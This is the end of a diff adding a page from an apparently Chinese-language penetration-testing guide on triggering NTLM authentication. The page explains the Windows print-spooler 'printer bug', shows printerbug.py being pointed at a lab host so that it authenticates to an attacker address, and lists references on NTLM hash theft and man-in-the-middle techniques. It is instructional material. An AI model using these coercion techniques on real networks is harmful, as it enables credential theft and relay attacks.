+<p>&#x4EFB;&#x4F55;&#x7ECF;&#x8FC7;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x7684;&#x57DF;&#x6210;&#x5458;&#x90FD;&#x53EF;&#x4EE5;&#x8FDE;&#x63A5;&#x5230;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x7684;&#x6253;&#x5370;&#x670D;&#x52A1;&#xFF08;spoolsv.exe&#xFF09;&#xFF0C;&#x5E76;&#x8BF7;&#x6C42;&#x5BF9;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x6253;&#x5370;&#x4F5C;&#x4E1A;&#x8FDB;&#x884C;&#x66F4;&#x65B0;&#xFF0C;&#x4EE4;&#x5176;&#x5C06;&#x8BE5;&#x901A;&#x77E5;&#x53D1;&#x9001;&#x7ED9;&#x6307;&#x5B9A;&#x76EE;&#x6807;&#x3002;&#x4E4B;&#x540E;&#x5B83;&#x4F1A;&#x5C06;&#x7ACB;&#x5373;&#x6D4B;&#x8BD5;&#x8BE5;&#x8FDE;&#x63A5;&#xFF0C;&#x5373;&#x5411;&#x6307;&#x5B9A;&#x76EE;&#x6807;&#x8FDB;&#x884C;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF08;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x901A;&#x8FC7;Kerberos&#x6216;NTLM&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;&#xFF09;&#x3002;&#x53E6;&#x5916;&#x5FAE;&#x8F6F;&#x8868;&#x793A;&#x8FD9;&#x4E2A;bug&#x662F;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x7279;&#x70B9;&#xFF0C;&#x65E0;&#x9700;&#x4FEE;&#x590D;&#x3002;</p>
+<p>&#x5982;&#x4E0B;&#x56FE;&#xFF0C;&#x4F7F;&#x7528;printerbug.py&#x5BF9;172.16.100.5&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#xFF0C;172.16.100.5&#x5C31;&#x4F1A;&#x5411;172.16.100.1&#x53D1;&#x8D77;ntlm &#x8BF7;&#x6C42;&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122131313616.png" alt="image-20191122131313616"></p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122131254839.png" alt="image-20191122131254839"></p>
+<h2 id="0x0c-&#x5F15;&#x7528;&#x6587;&#x7AE0;">0x0C &#x5F15;&#x7528;&#x6587;&#x7AE0;</h2>
+<ul>
+<li><a href="[https:/3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PDF%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96Net-NTLM-hash/](https:/3gstudent.github.io/3gstudent.github.io/&#x6E17;&#x900F;&#x6280;&#x5DE7;-&#x5229;&#x7528;PDF&#x6587;&#x4EF6;&#x83B7;&#x53D6;Net-NTLM-hash">&#x6E17;&#x900F;&#x6280;&#x5DE7;&#x2014;&#x2014;&#x5229;&#x7528;PDF&#x6587;&#x4EF6;&#x83B7;&#x53D6;Net-NTLM hash</a>)</li>
+<li><a href="[https:/3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E5%9B%BE%E6%A0%87%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/](https:/3gstudent.github.io/3gstudent.github.io/&#x6E17;&#x900F;&#x6280;&#x5DE7;-&#x5229;&#x7528;&#x56FE;&#x6807;&#x6587;&#x4EF6;&#x83B7;&#x53D6;&#x8FDE;&#x63A5;&#x6587;&#x4EF6;&#x670D;&#x52A1;&#x5668;&#x7684;NTLMv2-Hash">&#x5229;&#x7528;&#x56FE;&#x6807;&#x6587;&#x4EF6;&#x83B7;&#x53D6;&#x8FDE;&#x63A5;&#x6587;&#x4EF6;&#x670D;&#x52A1;&#x5668;&#x7684;NTLMv2 Hash</a>)</li>
+<li><a href="https://blog.netspi.com/microsoft-word-unc-path-injection-image-linking/" target="_blank">Microsoft Word &#x2013; UNC Path Injection with Image Linking</a></li>
+<li><a href="[https:/wooyun.js.org/drops/%E5%9F%BA%E4%BA%8EWPAD%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.html](https:/wooyun.js.org/drops/&#x57FA;&#x4E8E;WPAD&#x7684;&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;.html">&#x57FA;&#x4E8E;WPAD&#x7684;&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;</a>)</li>
+<li><a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" target="_blank">mitm6 &#x2013; compromising IPv4 networks via IPv6</a></li>
+</ul>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="4.html" class="navigation navigation-prev " aria-label="Previous page: NTLM 基础 介绍">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="6.html" class="navigation navigation-next " aria-label="Next page: Net- NTLM 利用">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"发起NTLM  请求","level":"1.3.2","depth":2,"next":{"title":"Net- NTLM 利用","level":"1.3.3","depth":2,"path":"ntlm/6.md","ref":"ntlm/6.md","articles":[]},"previous":{"title":"NTLM 基础 介绍","level":"1.3.1","depth":2,"path":"ntlm/4.md","ref":"ntlm/4.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"ntlm/5.md","mtime":"2019-12-10T13:44:06.846Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-12-10T14:24:39.969Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
